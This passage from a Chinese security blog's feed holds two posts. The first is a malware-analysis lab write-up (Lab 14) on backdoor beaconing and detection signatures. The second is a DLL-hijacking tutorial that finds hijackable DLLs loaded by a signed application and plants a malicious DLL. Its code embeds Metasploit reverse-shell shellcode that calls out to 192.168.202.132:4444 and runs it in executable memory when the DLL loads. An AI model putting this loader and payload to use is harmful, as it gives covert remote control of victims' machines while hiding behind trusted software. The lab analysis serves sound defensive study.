title="6.使用网络特征可能有效探测到恶意代码通信中的什么元素？"></a>6.使用网络特征可能有效探测到恶意代码通信中的什么元素？</h4><p>可以使用域名来进行探测</p><h4 id="7-分析者尝试为这个恶意代码开发一个特征时，可能会犯什么错误？"><a href="#7-分析者尝试为这个恶意代码开发一个特征时，可能会犯什么错误？" class="headerlink" title="7.分析者尝试为这个恶意代码开发一个特征时，可能会犯什么错误？"></a>7.分析者尝试为这个恶意代码开发一个特征时，可能会犯什么错误？</h4><p>这个没想到，看了下书上答案</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-6.png"></p><h4 id="8-哪些特征集可能检测到这个恶意代码（以及新的变种）？"><a href="#8-哪些特征集可能检测到这个恶意代码（以及新的变种）？" class="headerlink" title="8.哪些特征集可能检测到这个恶意代码（以及新的变种）？"></a>8.哪些特征集可能检测到这个恶意代码（以及新的变种）？</h4><p>可以用域名来作为一个检测的特征，还有BASE64编码也可以作为检测的特征之一。</p><h2 id="Lab-14-2"><a href="#Lab-14-2" class="headerlink" title="Lab 14-2"></a>Lab 14-2</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>使用fakenet工具模拟网络，可以看到程序发出的网络请求。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-1.png"></p><p>首先会读取字符串资源</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-2.png"></p><p>可以看到读取的字符串是<code>http://127.0.0.1/tenfour.html</code></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-3.png"></p><p>之后会创建管道，一个是<code>hWritePipe</code>另一个是<code>hReadPipe</code>，推测一个是用来写，一个是用来读。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-4.png"></p><p>创建一个CMD进程</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-5.png"></p><p>创建两个线程</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-6.png"></p><p>先来看一下第一个线程，它会读取cmd的输出结果，然后<code>sub_401000</code>是一个base64的编码，但是其码表是魔改的，然后会进入<code>sub_401750</code>将结果发送到<code>http://127.0.0.1/tenfour.html</code></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-7.png"></p><p>base64码表</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-8.png"></p><p>初始发送的内容</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-10.png"></p><p><code>sub_401750</code>将编码后的数据发送出去，<code>strcat</code>会在前面加上几个字符</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-9.png"></p><p>在前面添加<code>(!&lt;</code></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-11.png"></p><p>来看一下线程2，<code>sub_401800</code>会接收数据，然后会将接收到的数据写入管道，会在cmd中执行。接收到的数据如果是exit的话会直接退出线程</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-12.png"></p><p><code>sub_401800</code></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-13.png"></p><p>最后会执行<code>sub_401880</code>这个函数</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-14.png"></p><p>其中会进行自删除</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-15.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-16.png"></p><h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h3><h4 id="1-恶意代码编写时直接使用IP地址的好处和坏处各是什么？"><a href="#1-恶意代码编写时直接使用IP地址的好处和坏处各是什么？" class="headerlink" title="1.恶意代码编写时直接使用IP地址的好处和坏处各是什么？"></a>1.恶意代码编写时直接使用IP地址的好处和坏处各是什么？</h4><p>还是直接借用书上的答案吧，我也不是很明白说实话。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-17.png"></p><h4 id="2-这个恶意代码使用哪些网络库？使用这些库的好处和坏处是什么？"><a href="#2-这个恶意代码使用哪些网络库？使用这些库的好处和坏处是什么？" class="headerlink" title="2.这个恶意代码使用哪些网络库？使用这些库的好处和坏处是什么？"></a>2.这个恶意代码使用哪些网络库？使用这些库的好处和坏处是什么？</h4><p>使用了<code>wininet.dll</code>，我也不是很清楚优点以及缺点，就拿书上的来回答下吧。这些库的缺点之一是需要提供一个硬编码的<code>User-Agent</code>字段，另外如果需要的话，还需要硬编码可选的头部。相比于<code>Winsock API</code>，<code>WinINet</code>的优点是对于一些元素，比如cookie和缓存，可以由操作系统提供。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/2-18.png"></p><h4 id="3-恶意代码信令中URL的信息源是什么？这个信息源提供了哪些优势？"><a href="#3-恶意代码信令中URL的信息源是什么？这个信息源提供了哪些优势？" class="headerlink" title="3.恶意代码信令中URL的信息源是什么？这个信息源提供了哪些优势？"></a>3.恶意代码信令中URL的信息源是什么？这个信息源提供了哪些优势？</h4><p>是PE资源节中的IP地址，优势就是可以在不重新编译代码的情况，攻击者通过资源节来部署多个后门程序到多个命令与控制服务器位置。</p><h4 id="4-恶意代码利用了HTTP协议的哪个方面，来完成它的目的？"><a href="#4-恶意代码利用了HTTP协议的哪个方面，来完成它的目的？" class="headerlink" title="4.恶意代码利用了HTTP协议的哪个方面，来完成它的目的？"></a>4.恶意代码利用了HTTP协议的哪个方面，来完成它的目的？</h4><p>使用了<code>User-Agent</code>，包含着要执行的命令以及命令的回显。</p><h4 id="5-在恶意代码的初始信令中传输的是哪种信息？"><a href="#5-在恶意代码的初始信令中传输的是哪种信息？" class="headerlink" title="5.在恶意代码的初始信令中传输的是哪种信息？"></a>5.在恶意代码的初始信令中传输的是哪种信息？</h4><p>根据上面分析可以看到，是一个命令行的信息</p><h4 id="6-这个恶意代码通信信道的设计存在什么缺点？"><a href="#6-这个恶意代码通信信道的设计存在什么缺点？" class="headerlink" title="6.这个恶意代码通信信道的设计存在什么缺点？"></a>6.这个恶意代码通信信道的设计存在什么缺点？</h4><p>只有传给服务器的信息进行了编码，但是接收的指令并没有进行编码。</p><h4 id="7-恶意代码的编码方案是标准的吗？"><a href="#7-恶意代码的编码方案是标准的吗？" class="headerlink" title="7.恶意代码的编码方案是标准的吗？"></a>7.恶意代码的编码方案是标准的吗？</h4><p>不是标准的base64，码表被魔改了</p><h4 id="8-通信是如何被终止的？"><a href="#8-通信是如何被终止的？" class="headerlink" title="8.通信是如何被终止的？"></a>8.通信是如何被终止的？</h4><p>当攻击者发送exit时，就会终止通信</p><h4 id="9-这个恶意代码的目的是什么？在攻击者的工具中，它可能会起到什么作用？"><a href="#9-这个恶意代码的目的是什么？在攻击者的工具中，它可能会起到什么作用？" class="headerlink" title="9.这个恶意代码的目的是什么？在攻击者的工具中，它可能会起到什么作用？"></a>9.这个恶意代码的目的是什么？在攻击者的工具中，它可能会起到什么作用？</h4><p>一个后门工具，攻击者可以通过它来在目标主机上执行shell命令。</p><h2 id="Lab-14-3"><a href="#Lab-14-3" class="headerlink" title="Lab 14-3"></a>Lab 14-3</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>查看主函数，看到是一个<code>do-while</code>循环，主要执行了三个函数，<code>sub_401457</code>、<code>sub_4011F3</code>、<code>sub_401684</code>。现在来分别分析一下这三个函数。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-1.png"></p><p><code>sub_401457</code>主要是在C盘下创建一个文件autobat.exe，并在其中写入信息<code>http://www.practicalmalwareanalysis.com/start.htm</code>，<code>sub_401372</code>是创建文件，如果没有打开的话，说明不存在，会创建，并且向其中写入内容，然后再调用自身。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-2.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-3.png"></p><p><code>sub_4011F3</code>主要是从读取服务器的数据，然后进行处理，主要是将具体的指令提取出来。<code>sub_401000</code>主要是负责将远控指令给提取出来，分析可以知道指令前主要是<code>&lt;noscript&gt;</code>，也就是指令应该是在<code>&lt;noscript&gt;</code>标签内的内容，同时最后必须是<code>96</code>结尾。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-5.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-4.png"></p><p>接收到指令就会到<code>sub_401684</code>，里面是执行具体的远控命令。可以看到有四种命令。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-6.png"></p><p>指令为d的时候，会下载一个文件，并且执行，<code>sub_401147</code>是一个解密的过程，应该是将接收到的数据进行解码。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-7.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-8.png"></p><p>指令为n时，会直接返回1，而根据外面的分析，返回1就会退出执行。</p><p>指令为r时，会向<code>C:\autobat.exe</code>中写入内容。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-9.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-10.png"></p><p>指令为s时，会<code>sleep</code>指定的时间。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-11.png"></p><h3 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h3><h4 id="1-在初始信令中硬编码元素是什么？什么元素能够用于创建一个好的网络特征？"><a href="#1-在初始信令中硬编码元素是什么？什么元素能够用于创建一个好的网络特征？" class="headerlink" title="1. 在初始信令中硬编码元素是什么？什么元素能够用于创建一个好的网络特征？"></a>1. 在初始信令中硬编码元素是什么？什么元素能够用于创建一个好的网络特征？</h4><p>这些都是硬编码的元素，主要是<code>User-Agent</code>重复了，有两个，可以用于作为检测的网络特征。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-12.png"></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-13.png"></p><h4 id="2-初始信令中的什么元素可能不利于可持久使用的网络特征？"><a href="#2-初始信令中的什么元素可能不利于可持久使用的网络特征？" class="headerlink" title="2. 初始信令中的什么元素可能不利于可持久使用的网络特征？"></a>2. 初始信令中的什么元素可能不利于可持久使用的网络特征？</h4><p>域名，域名可以随时更换</p><h4 id="3-恶意代码是如何获得命令的？本章中的什么例子用了类似的方法？这种技术的优点是什么？"><a href="#3-恶意代码是如何获得命令的？本章中的什么例子用了类似的方法？这种技术的优点是什么？" class="headerlink" title="3. 恶意代码是如何获得命令的？本章中的什么例子用了类似的方法？这种技术的优点是什么？"></a>3. 恶意代码是如何获得命令的？本章中的什么例子用了类似的方法？这种技术的优点是什么？</h4><p>是通过<code>&lt;noscript&gt;</code>标签来获取命令的，这种技术恶意代码可以向一个合法的网页发出信令，并且接收合法内容，这使得防御者区分恶意流量与合法流量变得困难。</p><h4 id="4-当恶意代码接收到输入时，在输入上执行什么检查可以决定它是否是一个有用的命令？攻击者如何隐藏恶意代码正在寻找的命令列表？"><a href="#4-当恶意代码接收到输入时，在输入上执行什么检查可以决定它是否是一个有用的命令？攻击者如何隐藏恶意代码正在寻找的命令列表？" class="headerlink" title="4. 当恶意代码接收到输入时，在输入上执行什么检查可以决定它是否是一个有用的命令？攻击者如何隐藏恶意代码正在寻找的命令列表？"></a>4. 当恶意代码接收到输入时，在输入上执行什么检查可以决定它是否是一个有用的命令？攻击者如何隐藏恶意代码正在寻找的命令列表？</h4><p>分析中已经说明。</p><h4 id="5-什么类型的编码用于命令参数？它与BASE64编码有什么不同？它提供的优点和缺点各是什么？"><a href="#5-什么类型的编码用于命令参数？它与BASE64编码有什么不同？它提供的优点和缺点各是什么？" class="headerlink" title="5. 什么类型的编码用于命令参数？它与BASE64编码有什么不同？它提供的优点和缺点各是什么？"></a>5. 什么类型的编码用于命令参数？它与BASE64编码有什么不同？它提供的优点和缺点各是什么？</h4><p>分析中说的那个编码，它不是base64编码， 优点是自制的编码方式，缺点不知道，还是借用书上的答案吧。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-14.png"></p><h4 id="6-这个恶意代码会接收哪些命令？"><a href="#6-这个恶意代码会接收哪些命令？" class="headerlink" title="6. 这个恶意代码会接收哪些命令？"></a>6. 这个恶意代码会接收哪些命令？</h4><p>分析中分析的，会有四种命令，执行四种操作。</p><h4 id="7-这个恶意代码的目的是什么？"><a href="#7-这个恶意代码的目的是什么？" class="headerlink" title="7. 这个恶意代码的目的是什么？"></a>7. 这个恶意代码的目的是什么？</h4><p>远控木马，会根据命令来执行不同的操作。</p><h4 id="8-本章介绍了用独立的特征，来针对不同位置代码的想法，以增加网络特征的鲁棒性。那么在这个恶意代码中，可以针对哪些区段的代码，或是配置文件，来提取网络特征？"><a href="#8-本章介绍了用独立的特征，来针对不同位置代码的想法，以增加网络特征的鲁棒性。那么在这个恶意代码中，可以针对哪些区段的代码，或是配置文件，来提取网络特征？" class="headerlink" title="8. 本章介绍了用独立的特征，来针对不同位置代码的想法，以增加网络特征的鲁棒性。那么在这个恶意代码中，可以针对哪些区段的代码，或是配置文件，来提取网络特征？"></a>8. 本章介绍了用独立的特征，来针对不同位置代码的想法，以增加网络特征的鲁棒性。那么在这个恶意代码中，可以针对哪些区段的代码，或是配置文件，来提取网络特征？</h4><p>不太懂，借用书上的答案</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/3-15.png"></p><h4 id="9-什么样的网络特征集应该被用于检测恶意代码？"><a href="#9-什么样的网络特征集应该被用于检测恶意代码？" class="headerlink" title="9. 什么样的网络特征集应该被用于检测恶意代码？"></a>9. 什么样的网络特征集应该被用于检测恶意代码？</h4><p>主要就是域名和其中的一些参数吧</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>“白加黑”DLL劫持</title>
    <link href="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/"/>
    <url>/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DLL劫持就是劫持或者替换掉正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。其中有一种手法叫“白加黑”，就是一个“白”的EXE加载“黑“的DLL。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>DLL劫持的原理主要就是windows下加载DLL的顺序。在加载DLL的时候，系统会依次从以下六个位置去查找所需要的DLL文件</p><ol><li>程序所在目录</li><li>系统目录</li><li>16位系统目录</li><li>Windows目录</li><li>当前目录</li><li>PATH环境变量中的各个目录</li></ol><p>只要可以将准备好的DLL放在特定的目录下，先于原先的DLL被加载，就会实现劫持。</p><p>不过在win7之后，微软为了防御DLL劫持，将一些容易被劫持的DLL写入了一个注册表中HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs，在这里的DLL都会被禁止从程序所在目录下调用，只可以在系统目录下调用。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/1.png"></p><h2 id="一些要求"><a href="#一些要求" class="headerlink" title="一些要求"></a>一些要求</h2><p>要实现“白加黑”的话，DLL最好是有很少的导出函数，或是对于一个白应用来说不是必需的DLL，没有此DLL还是可以打开程序正常运行，这样的话都不需要进行函数的转发。白应用调用的自己编写的DLL最好也比较少，这样更加方便。</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>在这里可以使用工具来进行查找，使用Process Monitor工具。</p><p>根据刚才所讲，那么我们理清一下思路，现在需要找到一个可以使用的DLL，那么将某个白应用放在一个目录下，然后使用工具观察其加载DLL的情况，如果它尝试从当前目录下去加载某个DLL，那么可以尝试构造同名DLL来进行劫持。</p><p>在Process Monitor中设置一些过滤条件</p><blockquote><p><strong>Include</strong></p><p>Operation is CreateFile</p><p>Operation is LoadImage</p><p>Path contains .dll</p><p><strong>Exclude</strong></p><p>Result is SUCCESS</p></blockquote><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/2.png"></p><p>这里我随便在网上找了一个某播放器的安装包，是一个带数字签名的白应用，其次这个安装包也不带任何DLL。可以看到在启动它的时候，尝试在我这个123目录下寻找几个DLL，那么可以尝试伪造一下。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/3.png"></p><p>写一个弹计算器的DLL，然后改名为SHFOLDER.dll，具体哪个DLL名字可以用，还需要去实际测试，我试第一个VERSION并不可行，用这个是可以的。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_NORMAL);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>点击运行一下查看效果，成功弹出了计算机。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/1.gif"></p><p>然后在测试的时候，后台的浏览器一直是开着的，查看Process Monitor的时候，发现了一个浏览器的更新程序也在寻找一个DLL，这个也可以拿来利用， 并且这个程序很小，只有一百五十多KB。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/4.png"></p><p>现在来尝试一下利用MSF生成一个远控木马，来操作下。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/5.png"></p><p>然后把它写进DLL中，让DLL启动直接执行这段shellcode。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =<br><span class="hljs-string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x89\xe5&quot;</span><br><span class="hljs-string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><br><span class="hljs-string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span><br><span class="hljs-string">&quot;\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span><br><span class="hljs-string">&quot;\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3&quot;</span><br><span class="hljs-string">&quot;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1&quot;</span><br><span class="hljs-string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span><br><span class="hljs-string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span><br><span class="hljs-string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span><br><span class="hljs-string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span><br><span class="hljs-string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span><br><span class="hljs-string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span><br><span class="hljs-string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xca\x84\x68\x02&quot;</span><br><span class="hljs-string">&quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span><br><span class="hljs-string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span><br><span class="hljs-string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span><br><span class="hljs-string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span><br><span class="hljs-string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span><br><span class="hljs-string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span><br><span class="hljs-string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span><br><span class="hljs-string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span><br><span class="hljs-string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span><br><span class="hljs-string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    LPVOID Memory = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>    ((<span class="hljs-keyword">void</span>(*)())Memory)();<br>&#125;<br><span 